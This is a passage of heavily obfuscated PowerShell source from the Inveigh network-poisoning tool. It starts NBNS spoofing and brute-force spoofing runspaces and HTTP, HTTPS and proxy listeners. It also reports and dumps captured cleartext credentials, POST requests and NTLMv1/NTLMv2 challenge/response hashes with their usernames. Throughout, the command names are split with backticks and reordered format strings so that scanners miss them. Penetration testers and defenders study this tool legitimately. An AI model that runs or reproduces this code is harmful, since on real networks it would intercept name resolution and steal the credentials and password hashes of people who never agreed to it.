    ${NB`Ns`_S`POofEr`_POwERSHelL}.("{1}{2}{0}"-f'cript','Add','S').Invoke(${nBNS_SPoof`Er_S`cri`pTBLo`Ck}).("{0}{2}{1}{3}"-f 'Ad','rgu','dA','ment').Invoke(${insP`e`cT}).("{1}{0}{2}"-f 'en','AddArgum','t').Invoke(
        ${nbnS_r`e`SPOn`SE_M`esSAGE}).("{3}{1}{2}{0}"-f 'nt','r','gume','AddA').Invoke(${sp`ooFEr`ip}).("{1}{2}{3}{0}"-f't','A','d','dArgumen').Invoke(${nb`N`STYpES}).("{2}{1}{0}" -f'nt','rgume','AddA').Invoke(
        ${SP`OOf`erhOstSrE`p`Ly}).("{3}{1}{2}{0}"-f'ent','dArg','um','Ad').Invoke(${Sp`oOf`ERhoStsIG`N`o`RE}).("{3}{0}{2}{1}"-f'dArgum','nt','e','Ad').Invoke(${sP`ooF`ER`ip`SReplY}).("{2}{3}{0}{1}" -f 'gum','ent','Ad','dAr').Invoke(
        ${s`po`of`eRI`psi`GnOrE}).("{3}{0}{2}{1}" -f 'r','t','gumen','AddA').Invoke(${NB`NSTtl}) > ${n`ULl}
    ${NBnS`_s`P`oOfE`R_PO`weRshELL}.("{1}{2}{0}" -f 'ke','Beg','inInvo').Invoke() > ${N`UlL}
}


function nBnSbr`UTEF`orcE`spOOf`er()
{
    ${n`BN`S_bRuTE`FORCE_spO`ofEr_ruNsP`AcE} =  $5ZgH::("{2}{3}{1}{0}"-f 'ace','p','CreateR','uns').Invoke()
    ${NBn`s_`BRu`T`ef`OrCe_S`pOoFER_RUnSPAce}.("{1}{0}" -f'pen','O').Invoke()
    ${NB`Ns_bru`T`EforcE_s`Po`o`FER_runSPACE}."seS`s`ioNS`Tateproxy".("{1}{0}{2}" -f'iabl','SetVar','e').Invoke(("{1}{2}{0}"-f 'gh','i','nvei'),${I`NVeiGh})
    ${nB`Ns`_BRut`Efor`c`e_SpOofER`_P`ow`e`RShELL} =  (&("{1}{0}{2}"-f'r','Va','iABLe')  ('7'+'k4') ).vAlue::("{0}{1}"-f'Crea','te').Invoke()
    ${N`B`N`S_`BRUTeFO`RcE_spO`O`FER_pOwe`RshEll}."rUnS`Pa`cE" = ${nbnS`_brUteFo`Rce_sPoOFer`_R`UNS`pA`cE}
    ${nbN`S_`BrUTEFoRc`E_`spOOfeR_`Po`We`R`sh`e`Ll}.("{2}{0}{1}" -f 'ddScrip','t','A').Invoke(${ShaRED`_B`ASI`c_`FUN`CtIONS`_s`cRipTB`locK}) > ${nU`lL}
    ${nbns_B`RUTefOrC`E_`SPooFEr_`pOw`Er`sHe`lL}.("{1}{2}{0}"-f 'cript','A','ddS').Invoke(${NbNS_BR`U`Te`FOrce_`spoO`FEr_`SCriPtBlo`ck}).("{3}{1}{2}{0}"-f'nt','dArg','ume','Ad').Invoke(
        ${spo`OfEr`ip}).("{1}{0}{2}"-f'rgume','AddA','nt').Invoke(${N`BNSb`RU`T`EfoRC`EhO`sT}).("{0}{1}{2}" -f'A','d','dArgument').Invoke(${N`BN`S`BRuTeforc`e`TArGET}).("{1}{0}{2}"-f 'dArgumen','Ad','t').Invoke(
        ${NbnsBrU`T`EFOrc`ePA`Use}).("{0}{2}{1}" -f 'A','nt','ddArgume').Invoke(${N`BNSt`TL}) > ${Nu`lL}
    ${nBNs_B`R`UteF`orCE_`sP`Oo`F`eR_POW`eRSHELl}.("{1}{0}{2}"-f'ginInv','Be','oke').Invoke() > ${N`ULL}
}


function ConTRol`LO`oP()
{
    ${Con`TRol`_RUN`space} =   (&("{1}{0}{2}"-f '-','get','iteM') ("vAR"+"Iab"+"L"+"E:5ZGH") ).VAlUE::("{1}{2}{0}" -f'eateRunspace','C','r').Invoke()
    ${CoNt`R`ol_r`U`NSPA`CE}.("{1}{0}"-f'n','Ope').Invoke()
    ${co`N`T`ROL_`RUnsPAce}."S`es`sIOn`StATeproxY".("{2}{0}{1}"-f'etVari','able','S').Invoke(("{1}{2}{0}"-f 'eigh','i','nv'),${i`NVeIGH})
    ${COn`TROL_po`w`ersH`elL} =  (  &('ls')  vARiaBle:7k4).vaLUe::("{1}{2}{0}" -f'te','Cr','ea').Invoke()
    ${co`NTrO`L_p`OWE`RSHeLl}."RUNs`paCE" = ${c`onT`Rol`_RU`NSp`ACE}
    ${CON`TrO`l_pOwe`RS`H`eLl}.("{0}{2}{1}" -f'AddS','t','crip').Invoke(${s`HAr`e`d`_`BAsiC`_fU`NcTIONS_ScripT`Bl`Ock}) > ${N`UlL}
    ${Con`TRO`l_pOwerShE`lL}.("{2}{0}{1}"-f'ddScr','ipt','A').Invoke(${cOnT`RoL_SC`RI`Pt`BLOCK}).("{1}{2}{0}" -f'rgument','Ad','dA').Invoke(${c`oNsOLE`qu`Eue`LImIT}).("{0}{3}{1}{2}" -f'A','rgu','ment','ddA').Invoke(
        ${N`BN`sbR`U`TeF`ORcEpau`SE}).("{0}{1}{2}" -f'Ad','dArgum','ent').Invoke(${ruN`CoU`Nt}).("{2}{0}{1}" -f 'en','t','AddArgum').Invoke(${Ru`N`TiMe}) > ${nU`Ll}
    ${co`NtroL_po`w`ErShell}.("{0}{1}{2}" -f'B','eg','inInvoke').Invoke() > ${Nu`ll}
}






if(${hT`Tp} -eq 'Y')
{
    &("{2}{1}{0}"-f'r','PListene','HTT')
}


if(${h`TTPs} -eq 'Y')
{
    &("{1}{2}{0}{3}" -f 'ste','HTTPSL','i','ner')
}


if(${P`R`oxY} -eq 'Y')
{
    &("{1}{2}{0}"-f 'er','ProxyList','en')
}


if((${L`lMNr} -eq 'Y' -or ${Md`Ns} -eq 'Y' -or ${Nb`NS} -eq 'Y' -or ${s`MB} -eq 'Y' -or ${i`NS`PECt}) -and ${ElevaTed`_p`RI`ViL`eGE})
{ 
    &("{1}{0}{2}{4}{3}" -f 'n','S','iff','Spoofer','er')
}
elseif((${LlM`NR} -eq 'Y' -or ${m`DNs} -eq 'Y' -or ${N`Bns} -eq 'Y' -or ${s`mB} -eq 'Y') -and !${ELEVa`TED_P`R`I`VIlegE})
{

    if(${l`L`mNR} -eq 'Y')
    {
        &("{2}{0}{3}{1}"-f'o','er','LLMNRSpo','f')
    }

    if(${m`dnS} -eq 'Y')
    {
        &("{0}{1}{2}" -f 'mDNSSpo','ofe','r')
    }

    if(${nB`Ns} -eq 'Y')
    {
        &("{0}{3}{1}{2}"-f 'NBNS','of','er','Spo')
    }

    if(${nb`N`SBRUtEfor`cE} -eq 'Y')
    {
        &("{2}{4}{0}{3}{1}"-f 'Bru','er','NBN','teForceSpoof','S')
    }

}


if(${Nb`N`SBrUteFo`RCE} -eq 'Y')
{
    &("{2}{3}{5}{0}{4}{1}" -f 'o','r','NBNSBru','teF','fe','orceSpo')
}


if(${C`ONs`O`Leque`UeLImIt} -ge 0 -or ${iNV`EIgh}."F`iL`E_`outpUT" -or ${NbN`SB`RUtEfORcEpa`U`sE} -or ${R`UNc`Ount} -or ${Run`Ti`mE})
{
    &("{2}{0}{1}{3}" -f'nt','ro','Co','lLoop')
}


try
{

    if(${I`NVe`iGh}."cOnsolE`_O`U`Tp`Ut")
    {

        if(${coN`sO`Le`StaTUs})
        {    
            ${CoNS`o`Le_S`TATu`S_`TIme`OUT} = &("{3}{1}{0}{2}"-f'Spa','me','n','New-Ti') -Minutes ${conSOLEST`A`T`Us}
            ${cO`Ns`OLe_STatus_sT`opW`ATch} =   ( &("{2}{1}{0}" -f 'aBle','I','vAR')  ("b"+"sD")  -vA )::("{0}{2}{1}"-f 'Sta','New','rt').Invoke()
        }

        :console_loop while((${I`NvEI`GH}."Ru`Nn`INg" -and ${In`V`eigH}."C`o`NsoL`E_OUTP`Ut") -or (${i`Nv`EIGH}."cON`sOLE_`Q`UeUe"."cou`NT" -gt 0 -and ${INvE`I`gh}."CONsO`LE`_OU`T`PuT"))
        {
    
            while(${I`NVeI`gh}."coNsol`E_QU`EUE"."C`oUnT" -gt 0)
            {

                switch -wildcard (${invEi`gH}."c`on`Sole_Q`UEuE"[0])
                {

                    {${_} -like ("{3}{2}{0}{1}"-f 'en',' to *','writt','* ') -or ${_} -like ("{2}{4}{0}{3}{1}" -f 'r r','*','* ','elay ','fo') -or ${_} -like ("{1}{0}{2}"-f 'elay ','*SMB r','*') -or ${_} -like ("{5}{6}{0}{1}{4}{2}{3}" -f 'ocal a','dm','nistrato','r *','i','* ','l')}
                    {

                        if(${i`NvEI`gh}."oU`TpuT`_S`TRea`M_on`Ly")
                        {
                            &("{1}{2}{0}"-f'put','Write-','Out')(${InVe`i`Gh}."cO`NSoLE_qU`e`Ue"[0] + ${I`Nv`EIGh}."Ne`wlinE")
                        }
                        else
                        {
                            &("{0}{2}{1}"-f 'Wr','ning','ite-War')(${iNVE`igH}."cO`N`sOLE`_qUEUE"[0])
                        }

                        ${I`NV`eiGH}."CO`NS`oLe_QUEue".("{2}{0}{1}"-f'o','veAt','Rem').Invoke(0)
                    }

                    {${_} -like ("{1}{0}{2}{3}{4}"-f'er ','* spoof','i','s ','disabled') -or ${_} -like ("{1}{2}{3}{4}{0}"-f 'st','* local ','re','qu','e') -or ${_} -like ("{3}{0}{2}{1}" -f's','header *','t ','* ho') -or ${_} -like ("{0}{1}{4}{5}{6}{2}{3}" -f '* user',' ','ve','d *','agen','t ','recei')}
                    {

                        if(${CON`SOlEOU`TPUT} -eq 'Y')
                        {

                            if(${iN`VEiGH}."OuT`pUT`_S`TrEaM_o`NlY")
                            {
                                &("{2}{0}{1}" -f 'Ou','tput','Write-')(${InvEI`Gh}."CONso`lE`_que`Ue"[0] + ${iNv`eI`gh}."Ne`w`LInE")
                            }
                            else
                            {
                                &("{3}{1}{0}{2}" -f 'te-Outp','ri','ut','W')(${iN`VE`IGH}."c`OnS`OlE`_qUEUE"[0])
                            }

                        }

                        ${i`NVE`igh}."cOnSOLe`_qU`euE".("{1}{0}" -f 'moveAt','Re').Invoke(0)

                    } 

                    {${_} -like ("{0}{1}{4}{2}{3}" -f'* res','ponse','sen','t',' ') -or ${_} -like ("{0}{2}{1}"-f '* ',' *','ignoring') -or ${_} -like ("{0}{3}{4}{1}{2}"-f '* ','*request f','or *','H','TTP') -or ${_} -like ("{5}{6}{0}{1}{3}{4}{2}" -f 'ro','xy request ',' *','fo','r','*',' P')}
                    {
                    
                        if(${cO`NsOL`Eou`Tput} -ne "Low")
                        {

                            if(${INv`e`igH}."oUT`PU`T_S`TreAM_ONlY")
                            {
                                &("{1}{2}{0}"-f 'tput','Write','-Ou')(${I`N`VEiGH}."co`Ns`oLE`_`qUEUE"[0] + ${i`NV`eIGh}."NewL`I`NE")
                            }
                            else
                            {
                                &("{0}{2}{1}{3}"-f 'W','utp','rite-O','ut')(${iNV`eI`GH}."conso`L`E_`queUE"[0])
                            }

                        }

                        ${in`V`Eigh}."CONS`oL`E_`quEue".("{1}{2}{0}" -f't','R','emoveA').Invoke(0)

                    } 

                    ("{0}{2}{1}" -f 'd','lt','efau')
                    {

                        if(${InV`Ei`GH}."ou`TpUT_St`REaM_o`N`lY")
                        {
                            &("{3}{2}{0}{1}" -f'te-Ou','tput','ri','W')(${IN`VeigH}."Con`So`Le`_qU`eue"[0] + ${InvE`I`gH}."N`E`WlInE")
                        }
                        else
                        {
                            &("{2}{0}{1}" -f't','e-Output','Wri')(${I`N`Veigh}."CON`sole_que`UE"[0])
                        }

                        ${i`NVEI`gh}."cons`O`lE_`quEue".("{2}{0}{1}"-f 'o','veAt','Rem').Invoke(0)
                    }

                }

            }

            if(${CON`So`L`esTAt`Us} -and ${CoN`SolE_stATu`s_S`ToPW`AT`ch}."ELa`P`SED" -ge ${CO`N`SoLe_s`TATUs`_timEOuT})
            {
            
                if(${InvE`I`Gh}."cL`e`ARTeXT_Li`ST"."cO`UnT" -gt 0)
                {
                    &("{1}{2}{3}{0}"-f'put','W','rite-Ou','t')(("$(Get-Date -format 's') - Current unique cleartext captures: ") + ${INV`eI`gH}."N`eWLI`NE")
                    ${in`V`eiGH}."c`learTE`x`T_li`St".("{1}{0}"-f'rt','So').Invoke()

                    foreach(${uni`QuE`_Cl`EarTe`xT} in ${INv`Ei`gH}."C`leaRtEX`T_LiSt")
                    {
                        if(${U`N`IQue_`cL`eaRt`eXT} -ne ${U`NiqUE_cLe`ArtE`X`T_`l`Ast})
                        {
                            &("{2}{0}{1}" -f'ut','put','Write-O')(${UNi`Q`UE`_cle`Ar`TeXT} + ${i`NVEIGH}."neW`LI`NE")
                        }

                        ${unIqUE_`C`leAR`TexT_`LASt} = ${uNiqU`E_`c`LEART`ext}
                    }

                    &("{1}{2}{0}" -f 'p','St','art-Slee') -m 5
                }
                else
                {
                    &("{0}{2}{1}"-f 'Wr','-Output','ite')(("$(Get-Date -format 's') - No cleartext credentials have been captured ") + ${Inve`iGH}."NEW`LIne")
                }

                if(${in`Ve`iGH}."Post`_Re`QUe`s`T_lISt"."Co`Unt" -gt 0)
                {
                    &("{1}{3}{2}{0}" -f'put','Wr','-Out','ite')(("$(Get-Date -format 's') - Current unique POST request captures: ") + ${In`VeI`gH}."ne`WLI`Ne")
                    ${InVe`I`gH}."POSt`_`Re`qUesT`_l`ist".("{0}{1}"-f 'S','ort').Invoke()

                    foreach(${uN`IQue_P`OSt_REQu`est} in ${INvE`i`Gh}."pOST_REQue`s`T`_L`i`st")
                    {
                        if(${un`iq`U`E`_p`oST_rEQ`Uest} -ne ${un`IQU`e`_P`O`st_REque`ST_LASt})
                        {
                            &("{0}{2}{1}{3}" -f'Wr','O','ite-','utput')(${un`iQU`E_po`sT`_re`qUe`sT} + ${I`NV`EIgh}."Ne`W`LIne")
                        }

                        ${UN`i`qUE_POST_ReQUE`sT_l`A`St} = ${uN`IQ`UE_`pOST`_`ReQUe`ST}
                    }

                    &("{2}{1}{0}" -f 'Sleep','-','Start') -m 5
                }
            
                if(${inv`eI`gH}."nTl`M`V`1_liSt"."c`OunT" -gt 0)
                {
                    &("{0}{2}{1}"-f 'Write-','t','Outpu')(("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures: ") + ${Inve`i`GH}."N`eWLI`Ne")
                    ${I`N`VEiGH}."NtLm`V`1_`LiST".("{0}{1}" -f'S','ort').Invoke()

                    foreach(${U`NiQU`E_n`TlMv1} in ${INV`EiGH}."nT`LMv1_l`ISt")
                    {
                        ${UN`IQ`U`E_`NTlMv1_a`CCO`Unt} = ${unIque_`N`TL`Mv1}.("{0}{2}{1}" -f'SubSt','ing','r').Invoke(0,${un`IQ`UE_NT`lM`V1}.("{1}{0}"-f'Of','Index').Invoke(":",(${UnIqUE_NtL`M`V1}.("{1}{0}"-f'dexOf','In').Invoke(":") + 2)))

                        if(${unIQue`_N`T`lMv`1_AC`cO`Unt} -ne ${uNIQue_`NtL`mV1_aCcOuN`T_LA`ST})
                        {
                            &("{2}{1}{0}{3}" -f 'e-Outp','t','Wri','ut')(${UnI`qUE_Nt`lmV1} + ${Inv`E`IGh}."NEw`Li`NE")
                        }

                        ${uN`iQ`UE`_NTL`Mv1_acCouNt_l`A`st} = ${unIQu`e_`NT`LmV1`_ACcoU`NT}
                    }

                    ${un`iquE_nTLM`V1`_`ACC`Ount`_lA`st} = ''
                    &("{1}{3}{0}{2}"-f'e','Start','ep','-Sl') -m 5
                    &("{1}{0}{2}"-f 'te-O','Wri','utput')(("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames: ") + ${I`NVei`GH}."nEwlI`NE")

                    foreach(${Nt`lMv1_U`s`Ern`AME} in ${i`NVe`IGh}."nT`lmV1_u`sERnAMe_`L`IsT")
                    {
                        &("{2}{0}{1}{3}" -f'Ou','tp','Write-','ut')(${nTlM`V1_uS`E`R`Name} + ${in`V`EigH}."neWLi`Ne")
                    }

                    &("{1}{2}{0}" -f 'leep','Start','-S') -m 5
                }
                else
                {
                    &("{2}{0}{3}{1}" -f'i','utput','Wr','te-O')(("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured ") + ${I`Nv`Eigh}."neW`li`Ne")
                }

                if(${IN`V`eIgh}."NTlM`V2_`LiSt"."cO`UNT" -gt 0)
                {
                    &("{0}{1}{2}"-f 'Write-Out','p','ut')(("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures: ") + ${iNVE`IgH}."new`lINE")
                    ${inVE`iGh}."nt`l`mV2`_LiST".("{1}{0}"-f't','Sor').Invoke()

                    foreach(${Un`iQue_`N`TLmv2} in ${IN`Veigh}."NtlMv2_L`I`St")
                    {
                        ${u`NIquE`_ntlMV2_`AccoUnt} = ${u`Ni`quE_nTlm`V2}.("{0}{1}" -f 'Sub','String').Invoke(0,${uNIqU`E`_`NTLmV2}.("{0}{1}"-f 'Index','Of').Invoke(":",(${U`NIqUe`_`NTl`Mv2}.("{0}{1}" -f 'IndexO','f').Invoke(":") + 2)))

                        if(${unIQUe_N`TlM`V`2_`Ac`coUnt} -ne ${u`NIQUE`_nt`LmV2_`AccOUNt_`La`ST})
                        {
                            &("{1}{0}{2}{3}" -f 'i','Wr','t','e-Output')(${uni`quE`_nTLmv2} + ${i`NVe`IGH}."New`liNE")
                        }

                        ${u`Ni`qUe_ntl`mV2_ACC`ount_LA`St} = ${unIQu`e_NtlM`V2_`A`CcO`U`NT}
                    }

                    ${U`Niqu`e_n`T`lMv2_ACco`UnT_L`AST} = ''
                    &("{2}{1}{0}"-f't-Sleep','tar','S') -m 5
                    &("{1}{0}{2}" -f'e-Outpu','Writ','t')(("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames: ") + ${i`NvEi`Gh}."ne`Wl`InE")

                    foreach(${nTLmv`2`_uSErna`me} in ${inv`eI`gh}."ntLmV`2`_Use`R`NAm`E_`lisT")
                    {
                        &("{0}{1}{3}{2}" -f 'W','rite','t','-Outpu')(${Nt`l`mV2_`UseRnaME} + ${I`NVeI`Gh}."NeW`line")
                    }
                
                }
                else
                {
                    &("{1}{2}{3}{0}"-f 'tput','Write','-O','u')(("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured ") + ${iNVEI`gH}."NeW`L`INe")
                }

                ${con`S`olE_staT`Us_s`ToPWatCh} =   (  &("{1}{2}{0}"-f 'E','vARI','AbL')  bSd  -VAluE  )::("{1}{0}{2}" -f'tNe','Star','w').Invoke()

            }

            if(${I`N`VeiGH}."C`onSoLe_I`NpUt")
            {

                if(  ( &("{1}{0}{2}"-f'ArIabl','v','e') ("7"+"091A") -Val)::"KEY`A`V`AIlablE")
                {
                    ${i`NV`EiGh}."cON`SOlE_`OUtput" = ${F`ALSe}
                    BREAK ("{1}{0}{2}{3}" -f 'onsole','c','_loo','p')
                }
        
            }

            &("{1}{2}{0}" -f'p','St','art-Slee') -m 5
        }

    }

}
finally
{

    if(${to`ol} -eq 2)
    {
        ${iNVE`iGH}."R`Unn`ing" = ${Fa`l`Se}
    }

}

}


function st`O`P-I`NVeIGh
{


if(${iNve`I`GH})
{

    if(${inVEI`Gh}."RUn`Ni`Ng" -or ${InV`eI`Gh}."reLay_`Run`Ning")
    {

        if(${I`NvE`IGH}."HT`TPs" -and !${iN`VE`IGh}."h`Ttps_`EX`istiNg_CE`RTI`FI`CAte" -or (${inVei`gH}."hTTPs_EXIs`Ti`NG`_CErTIF`ICaTE" -and ${i`N`VEIgH}."HtT`p`S_foRc`E_c`ERTI`Fica`Te_dE`le`TE"))
        {

            try
            {
                ${CeR`TIfiCATe_s`T`ORe} = &("{2}{0}{1}{3}"-f'Obj','e','New-','ct') ("{12}{6}{5}{14}{2}{3}{13}{10}{9}{0}{1}{7}{11}{4}{8}" -f'e','s.','hy.X5','0','St','pt','ty.Cry','X50','ore','at','c','9','System.Securi','9Certifi','ograp')("My",("{0}{1}{2}"-f'LocalMac','hin','e'))
                ${C`e`RtifI`caTE_sTo`RE}.("{1}{0}" -f 'pen','O').Invoke(("{0}{1}" -f 'ReadWri','te'))
                ${CER`TIFicaT`eS} = (&("{1}{0}{3}{2}" -f '-','Get','Item','Child') ((("{4}{2}{3}{1}{0}" -f'lMachine7CoMy','oca','t:7C','oL','Cer'))-CReplaCE'7Co',[ChAr]92) | &("{3}{2}{0}{1}"-f 'e','ct','-Obj','Where') {${_}."iSS`UeR" -Like "CN=" + ${I`Nve`iGH}."c`ERTiFICa`T`e_iSSUer"})

                ForEach(${C`Er`T`ifICATe} in ${Ce`RtIF`ICAteS})
                {
                    ${C`eRTiFI`CAtE_sTo`RE}.("{2}{0}{1}" -f'emo','ve','R').Invoke(${cErT`IFIC`A`TE})
                }

                ${cErt`IfICAT`E_`STOrE}.("{1}{0}"-f 'se','Clo').Invoke()
            }
            catch
            {
                &("{2}{0}{1}" -f'utpu','t','Write-O')(("{11}{2}{6}{5}{8}{1}{3}{9}{4}{0}{7}{10}"-f' Man','or - Rem','ificat','o','e','De','e ','u','letion Err','v','ally','SSL Cert'))

                if(${I`NV`eiGh}."file_`OU`TP`UT")
                {
                    ("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually ") | &("{0}{1}{2}"-f'Ou','t-Fil','e') ${Inv`E`IgH}."LO`G_`Out_f`ILe" -Append   
                }

                if(${iN`VeI`GH}."lO`G_O`Utp`Ut")
                {
                    ${i`N`VEigh}."l`og".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))  > ${nu`lL}
                }

            }

        }
            
        if(${InV`EIgh}."RelAy`_`RuN`Ning")
        {

            if(${I`NvEiGH}."FilE_`OuTp`UT")
            {
                ("$(Get-Date -format 's') - Inveigh Relay exited ") | &("{0}{1}" -f'Out-Fi','le') ${invE`iGh}."LoG_o`U`T_fIlE" -Append
            }

            if(${inv`EIGh}."l`Og`_oUTpUt")
            {
                ${in`VEIgH}."L`OG".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Inveigh Relay exited "))  > ${n`ULl}
            }

            &("{2}{1}{0}{3}"-f 'tp','ite-Ou','Wr','ut')(("Inveigh Relay exited at $(Get-Date -format 's') "))
            ${i`N`VEIgH}."re`l`AY_rU`N`NING" = ${f`AL`Se}

        } 

        if(${inVE`i`gh}."RUN`NiNg")
        {

            if(${i`NVEI`Gh}."fil`e_`oUtp`UT")
            {
                ("$(Get-Date -format 's') - Inveigh exited ") | &("{2}{0}{1}" -f 'u','t-File','O') ${Inve`IgH}."Log_OuT_`F`iLe" -Append
            }

            if(${in`Ve`igH}."LoG_`oU`TpUT")
            {
                ${INv`eIgH}."l`og".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Inveigh exited "))  > ${Nu`LL}
            }

            &("{0}{1}{2}{3}"-f 'Write-O','ut','pu','t')(("Inveigh exited at $(Get-Date -format 's') "))
            ${Inv`e`igh}."runn`InG" = ${f`Alse}
            
        }

        ${INv`ei`Gh}."h`TTpS" = ${FA`LSE}
        &("{1}{2}{0}"-f 'p','Start-Sle','e') -S 5
    }
    else
    {
        &("{0}{1}{2}"-f'Writ','e-Outp','ut')(("{5}{2}{6}{1}{3}{0}{4}" -f'n','nveigh functi','here are no running','o','s','T',' I'))
    }

}

}

function G`ET-i`N`VeigH
{


[CmdletBinding()]
param
( 
    [parameter(MANDAToRY=${FA`l`se})][Switch]${cLe`A`RTeXT},
    [parameter(MAndATory=${fA`L`se})][Switch]${c`l`Eart`exT`UNIquE},
    [parameter(ManDAtoRY=${fa`l`sE})][Switch]${c`OnsolE},
    [parameter(mANDAtOrY=${FA`lSE})][Switch]${leaRni`Ng},
    [parameter(MAnDatOry=${Fa`L`sE})][Switch]${l`Og},
    [parameter(ManDATOry=${Fal`sE})][Switch]${NT`Lmv1},
    [parameter(mANDATOrY=${Fal`se})][Switch]${NtL`Mv2},
    [parameter(manDaTorY=${f`ALSE})][Switch]${nTlmV1U`N`I`quE},
    [parameter(MAndatorY=${FA`LSE})][Switch]${NTlMv2UN`Iq`Ue},
    [parameter(MaNdaTORY=${f`A`LSe})][Switch]${NTlMv1u`sERN`A`M`Es},
    [parameter(mandAtORy=${f`Al`sE})][Switch]${N`TLMV`2User`NAMES},
    [parameter(MandAtORY=${fa`l`SE})][Switch]${PoSt`ReQ`UEsT},
    [parameter(mANdatoRy=${F`Alse})][Switch]${P`OSTR`e`QU`ESTUNiquE},
    [parameter(VALUefRomreMAININGarguMeNTS=${T`Rue})]${I`NvAL`i`D_paraMEt`Er}
)

if(${cON`Sole} -or ${pSb`O`UndpaRa`MEt`Ers}."coU`NT" -eq 0)
{

    while(${inVe`i`GH}."ConS`OL`e_q`UEUe"."Co`Unt" -gt 0)
    {

        if(${i`N`VeIGh}."OUTPut_ST`R`Eam_`ONLy")
        {
            &("{0}{1}{2}" -f'Write','-Outpu','t')(${iN`Ve`iGH}."cOnS`OLe_`qUeUE"[0] + ${iN`VEIgH}."new`liNe")
            ${INvEi`gh}."COnSol`e_q`UeuE".("{2}{0}{1}"-f'eA','t','Remov').Invoke(0)
        }
        else
        {

            switch -wildcard (${IN`Ve`Igh}."COn`SoLE`_`queue"[0])
            {

                {${_} -like ("{0}{3}{1}{2}"-f'* ','ten',' to *','writ') -or ${_} -like ("{1}{2}{0}" -f'elay *','* ','for r') -or ${_} -like ("{2}{3}{1}{0}"-f'*',' ','*S','MB relay') -or ${_} -like ("{4}{0}{3}{1}{2}"-f ' local admi','istrator ','*','n','*')}
                {
                    &("{0}{2}{1}" -f'Write-Warn','g','in') ${I`Nv`Eigh}."C`ONs`oL`e_Qu`Eue"[0]
                    ${Inv`E`IgH}."cONS`oL`E_`qU`EuE".("{2}{0}{1}"-f'emo','veAt','R').Invoke(0)
                }

                ("{0}{1}{2}" -f'defa','u','lt')
                {
                    &("{2}{3}{0}{1}" -f'-Outp','ut','W','rite') ${I`Nv`eIGh}."COnsOlE_q`U`Eue"[0]
                    ${INVe`i`gH}."CO`NsoLE`_queUE".("{2}{1}{0}" -f 'veAt','mo','Re').Invoke(0)
                }

            }

        }
         
    }

}

if(${l`Og})
{
    &("{1}{3}{2}{0}"-f'ut','Writ','-Outp','e') ${inV`EIGH}."L`oG"
}

if(${Nt`lMV1})
{
    &("{1}{0}{2}"-f 't','Wri','e-Output') ${i`Nv`EIgH}."NTLM`V1`_L`Ist"
}

if(${nt`LMv`1uNiQUe})
{
    ${iNV`Ei`gh}."ntl`MV1_LI`St".("{0}{1}" -f 'Sor','t').Invoke()

    foreach(${U`NiquE`_nt`L`Mv1} in ${I`NV`eiGh}."NTLmv1_`lI`sT")
    {
        ${U`NI`Q`Ue_nt`lMV1_A`C`coUnT} = ${unIQ`Ue`_N`T`lMv1}.("{0}{1}{2}" -f 'Sub','Strin','g').Invoke(0,${U`NIQUE_`Nt`lm`V1}.("{2}{1}{0}" -f 'xOf','e','Ind').Invoke(":",(${U`NI`Q`Ue`_nTlMv1}.("{1}{0}{2}"-f'ndex','I','Of').Invoke(":") + 2)))

        if(${uNi`Qu`E`_`NtLM`V1_ACCO`UNT} -ne ${uN`IQue_NTl`mV1_ACcOU`Nt`_LaST})
        {
            &("{2}{1}{0}{3}"-f 'tp','Ou','Write-','ut') ${UN`iQU`E`_nT`LMv1}
        }

        ${u`NiqUe_nT`lmv1_ac`cou`Nt`_l`AsT} = ${UN`ique_`NtlmV1_a`C`COUnt}
    }

}

if(${nt`lMv1`USE`RNameS})
{
    &("{1}{3}{2}{0}"-f'Output','Wri','e-','t') ${In`V`EIGh}."NTlMv2`_uSe`RnAMe`_`li`sT"
}

if(${Nt`LMv2})
{
    &("{3}{2}{1}{0}"-f't','tpu','rite-Ou','W') ${i`NvEI`GH}."Ntlm`V`2_LI`st"
}

if(${n`T`LMv2u`NI`que})
{
    ${Inv`E`Igh}."n`TLMV2`_LI`ST".("{1}{0}"-f'rt','So').Invoke()

    foreach(${Uniq`Ue_N`TL`mV2} in ${I`Nv`Eigh}."N`TLMV2`_LIST")
    {
        ${uniQuE`_nT`lmV2`_A`CcOunt} = ${u`NIQUE_n`Tl`Mv2}.("{1}{0}{2}"-f 't','SubS','ring').Invoke(0,${uni`qU`e_`NTL`MV2}.("{0}{2}{1}" -f 'Inde','Of','x').Invoke(":",(${uNiQu`e_NTL`mV2}.("{1}{0}"-f 'dexOf','In').Invoke(":") + 2)))

        if(${UNIQ`Ue_N`TL`Mv`2_aCCOuNT} -ne ${UNi`qUE_Ntlmv`2_a`CCount_L`AST})
        {
            &("{0}{3}{2}{1}"-f'Write','t','pu','-Out') ${uNiq`U`E_ntlmv2}
        }

        ${uNIq`Ue`_n`TLmv2_`A`ccOUnT_LaST} = ${U`N`IquE_ntLMV`2_`A`ccO`UNT}
    }

}

if(${nT`Lmv2`UsE`R`NamEs})
{
    &("{1}{2}{0}{3}"-f 'u','W','rite-O','tput') ${iN`VeIGh}."NtLmv2_U`Se`R`N`AME`_LIST"
}

if(${Cl`Ea`RtexT})
{
    &("{0}{2}{1}"-f 'Wr','e-Output','it') ${In`V`Eigh}."cLEART`eX`T_LIST"
}

if(${C`le`AR`TEX`TUnIquE})
{
    &("{2}{1}{0}{3}" -f 'Outp','rite-','W','ut') ${INveI`gH}."cleaRT`eXT`_`LIsT" | &("{1}{0}{3}{2}" -f 'et-Un','G','ue','iq')
}

if(${p`Os`TReQUEST})
{
    &("{1}{2}{3}{0}"-f'e-Output','W','r','it') ${in`V`EiGH}."POS`T_rEQu`E`s`T_LiST"
}

if(${PO`S`TREquES`Tu`N`iQUE})
{
    &("{3}{0}{1}{2}"-f'e-','Outpu','t','Writ') ${InVEi`Gh}."pos`T_ReQ`UEsT_`Li`St" | &("{3}{2}{1}{0}"-f 'ue','Uniq','et-','G')
}

if(${L`Ea`RnIng})
{
    &("{0}{1}{3}{2}"-f'Writ','e-','put','Out') ${i`NVE`IgH}."VA`LID_H`Os`T_`LIst"
}

}

